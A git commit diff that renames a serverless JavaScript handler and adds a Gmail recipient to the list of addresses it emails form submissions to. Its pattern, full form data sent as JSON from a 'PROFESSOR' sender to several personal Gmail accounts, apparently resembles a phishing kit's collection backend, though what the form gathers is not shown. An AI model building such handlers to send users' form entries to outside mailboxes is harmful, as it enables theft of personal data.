ca7d22c5eb3d6f20b6c8cab6e1faa46e222a7817
zm9807350 <zm9807350@gmail.com>
2026-01-30 13:38:17 +0500

    Update and rename sattar.js to Dilbar.js

--- Dilbar.js
+++ Dilbar.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,",
-      subject: "Ab-Satar",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,dilbarnizamani671@gmail.com",
+      subject: "Dilbar",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
